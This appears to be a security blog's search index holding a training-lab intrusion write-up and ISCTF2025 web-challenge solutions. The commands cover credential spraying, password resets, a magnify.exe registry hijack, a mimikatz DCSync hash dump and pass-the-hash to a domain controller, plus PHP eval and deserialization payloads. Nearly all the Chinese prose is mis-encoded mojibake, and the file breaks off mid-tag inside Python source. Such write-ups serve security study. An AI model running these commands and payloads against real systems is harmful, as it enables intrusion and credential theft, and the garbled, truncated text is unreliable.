<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œTsclient</title>
      <link href="/2025/12/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"/>
      <url>/2025/12/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><p>fscanæ¼æ‰«ä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251216231654859.png" alt="image-20251216231654859"></p><p>MDUTæ•°æ®åº“è¿æ¥å·¥å…·è¿æ¥ä¸€ä¸‹ï¼Œæ²¡æƒé™ï¼Œä¸Šä¼ ä¸€ä¸ªç”œåœŸè±†ææƒ</p><img src="../images/achieve/2025/12/image-20251216232809685.png" alt="image-20251216232809685"  /><h2 id="å†…ç½‘æ‰“ç‚¹"><a href="#å†…ç½‘æ‰“ç‚¹" class="headerlink" title="å†…ç½‘æ‰“ç‚¹"></a>å†…ç½‘æ‰“ç‚¹</h2><p>æç¤ºç”¨æˆ·ä¼šè¯ï¼Œå…ˆä¸Šçº¿cs</p><figure class="highlight shell"><figcaption><span>query user || qwinsta``æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251216233252828](../images/achieve/2025/12/image-20251216233252828.png)</span><br><span class="line"></span><br><span class="line">å°è¯•è¿›ç¨‹æ³¨å…¥ï¼ŒæˆåŠŸè·å–ï¼Œ``net use``æŸ¥çœ‹å…±äº«</span><br><span class="line"></span><br><span class="line">![image-20251216233823396](../images/achieve/2025/12/image-20251216233823396.png)</span><br><span class="line"></span><br><span class="line">ä¸‹é¢æœ‰ä¸ªå‡­è¯</span><br><span class="line"></span><br><span class="line">![image-20251216233901612](../images/achieve/2025/12/image-20251216233901612.png)</span><br><span class="line"></span><br><span class="line">å¼€å§‹æ”¶é›†å†…ç½‘ä¿¡æ¯ï¼Œä¸Šä¼ fscan</span><br><span class="line"></span><br><span class="line">```tex</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line"></span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN-WEB</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.18</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]2001:0:348b:fb58:83f:175d:d89d:9280</span></span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]DC01</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.15</span></span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN19-CLIENT</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.31</span></span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN2016</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.46</span></span><br><span class="line"></span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 172.22.8.15 åŸŸæ§</span><br><span class="line">2. 172.22.8.31 åŸŸå†…æœºå™¨</span><br><span class="line">3. 172.22.8.18 å·²æ‹¿ä¸‹</span><br><span class="line">4. 172.22.8.46 åŸŸå†…æœºå™¨</span><br></pre></td></tr></table></figure><p>åŒæ—¶æ­å»ºå¥½éš§é“å¼€å§‹æ‰“å†…ç½‘ï¼Œæ‹¿åˆšåˆšçš„è´¦å·å¯†ç å»è¿›è¡ŒæŒ¨ä¸ªå°è¯•ï¼Œåˆ©ç”¨kaliä¸Šé¢çš„å·¥å…·</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€<span class="params">#</span> proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!<span class="params">#</span>&#x27;</span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>LOGON<span class="built_in">_</span>FAILURE </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br></pre></td></tr></table></figure><p>æœ‰äº›å¯†ç è¿‡æœŸäº†ï¼Œæ²¡å…³ç³»ç›´æ¥æ”¹å¯†ç å³å¯</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-changepasswd xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!<span class="params">#</span>&#x27;@172.22.8.15 -newpass &#x27;Admin@666&#x27;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åªæœ‰172.22.8.46è¿™ä¸ªå¯ä»¥ç™»å½•</p><p><img src="/../images/achieve/2025/12/image-20251217100612264.png" alt="image-20251217100612264"></p><p>å‰é¢æç¤ºäº†é•œåƒåŠ«æŒï¼Œçœ‹çœ‹æ³¨å†Œè¡¨æƒé™</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -path &quot;HKLM:<span class="keyword">\SOFTWARE</span><span class="keyword">\Microsoft</span><span class="keyword">\Windows</span> NT<span class="keyword">\CurrentVersion</span><span class="keyword">\Image</span> File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251217100829220.png" alt="image-20251217100829220"></p><p>ç™»å½•è¿›æ¥çš„ç”¨æˆ·éƒ½å¯ä¿®æ”¹ï¼Œæˆ‘ä»¬åˆ©ç”¨æ”¾å¤§é•œææƒ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM<span class="keyword">\SOFTWARE</span><span class="keyword">\Microsoft</span><span class="keyword">\Windows</span> NT<span class="keyword">\CurrentVersion</span><span class="keyword">\Image</span> File Execution Options<span class="keyword">\magnify</span>.exe&quot; /v Debugger /t REG<span class="built_in">_</span>SZ /d &quot;C:<span class="keyword">\windows</span><span class="keyword">\system</span>32<span class="keyword">\cmd</span>.exe&quot;</span><br></pre></td></tr></table></figure><p><code>type &quot;C:\Users\Administrator\flag\flag02.txt&quot;</code>æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><p><img src="/../images/achieve/2025/12/image-20251217101034462.png" alt="image-20251217101034462"></p><p>ç„¶åæˆ‘ä»¬åšæ¨ªå‘ï¼Œå…ˆæ”¶é›†è¿™å°æœºå™¨åœ¨åŸŸä¸­çš„å…³ç³»ï¼Œåˆ©ç”¨bloodhoundè¿™ä¸ªå·¥å…·</p><p><img src="/../images/achieve/2025/12/image-20251217101415030.png" alt="image-20251217101415030"></p><p>å¯ä»¥çœ‹åˆ°è¿™å°æœºå™¨ä¹Ÿæ˜¯ä¸€å°åŸŸæ§æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬ä¸Šä¼ çŒ•çŒ´æ¡ƒç›´æ¥æŠ“å–hash</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="params">#</span> lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">502     krbtgt  3ffd5b58b4a6328659a606c3ea6f9b63        514</span><br><span class="line">1000    DC01<span class="built_in">$</span>   ca4725b5186b3a6699d56662b7a9b7c2        532480</span><br><span class="line">500     Administrator   2c9d81bdcf3ec8b1def10328a7cc2f08        512</span><br><span class="line">1103    WIN2016<span class="built_in">$</span>        a1fbbb8b692fc8bc39c97e6eee719a23        16781312</span><br><span class="line">1104    WIN19-CLIENT<span class="built_in">$</span>   c043da1da4cd586619bc02ff8940d654        16781312</span><br><span class="line">1105    Aldrich c7c654da31ce51cbeecfef99e637be15        512</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘kaliçš„<code>crackmapexec</code>æ‰“Â·å“ˆå¸Œä¼ é€’</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u administrator -H 2c9d81bdcf3ec8b1def10328a7cc2f08 -d xiaorang.lab -x &quot;type Users<span class="keyword">\Administrator</span><span class="keyword">\flag</span><span class="keyword">\flag</span>03.txt&quot;</span><br></pre></td></tr></table></figure><p>åŸŸæ§ï¼Œæ‹¿åˆ°ç¬¬ä¸‰ä¸ªflag</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é•œåƒåŠ«æŒ </tag>
            
            <tag> CSè¿›ç¨‹æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2025</title>
      <link href="/2025/12/09/ISCTF2025/"/>
      <url>/2025/12/09/ISCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="b-by-n0t1ce-b0ard"><a href="#b-by-n0t1ce-b0ard" class="headerlink" title="b@by n0t1ce b0ard"></a>b@by n0t1ce b0ard</h2><p><code>CVE-2024-12233</code>ç›´æ¥ä¸Šç½‘æœ<a href="https://github.com/LamentXU123/cve/blob/main/RCE1.md">cve&#x2F;RCE1.md åœ¨ä¸»çº¿ Â·LamentXU123&#x2F;cve â€” cve&#x2F;RCE1.md at main Â· LamentXU123&#x2F;cve</a>æ‹¿æ¥ç›´æ¥æ‰“å°±è¡Œ</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z\(\)_;]+$/&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¸ˆå‚…ï¼Œä½ æƒ³æ‹¿flagï¼Ÿ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾å°±æ˜¯ä¸€ä¸ªæ— å‚æ•°rceï¼Œåˆ©ç”¨<code>get_defined_vars()</code>è¿›è¡Œé€ƒé€¸</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get<span class="built_in">_</span>defined<span class="built_in">_</span>vars())));<span class="built_in">&amp;</span>b=system(&#x27;tac /f*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="æ¥ç­¾ä¸ªåˆ°å§"><a href="#æ¥ç­¾ä¸ªåˆ°å§" class="headerlink" title="æ¥ç­¾ä¸ªåˆ°å§"></a>æ¥ç­¾ä¸ªåˆ°å§</h2><p>phpçš„ååºåˆ—åŒ–ç›´æ¥æ‰“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$logfile</span>; <span class="keyword">public</span> <span class="variable">$content</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$url</span>; <span class="keyword">public</span> <span class="variable">$logger</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">ShitMountant</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;url = <span class="string">&quot;file:///flag&quot;</span>;</span><br><span class="line"><span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line"><span class="comment">// æ˜¾å¼è®¾ç½®ä¸€ä¸ªéç©ºçš„ã€åˆæ³•çš„ logfile è·¯å¾„</span></span><br><span class="line"><span class="variable">$logger</span>-&gt;logfile = <span class="string">&quot;/tmp/notehub.log&quot;</span>;</span><br><span class="line"><span class="variable">$logger</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST:shark=blueshark:O:12:&quot;ShitMountant&quot;:2:&#123;s:3:&quot;url&quot;;s:12:&quot;file:///flag&quot;;s:6:&quot;logger&quot;;O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:16:&quot;/tmp/notehub.log&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line">api.php?id=1</span><br></pre></td></tr></table></figure><h2 id="éš¾è¿‡çš„bottle"><a href="#éš¾è¿‡çš„bottle" class="headerlink" title="éš¾è¿‡çš„bottle"></a>éš¾è¿‡çš„bottle</h2><p>ç»™å‡ºæºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span 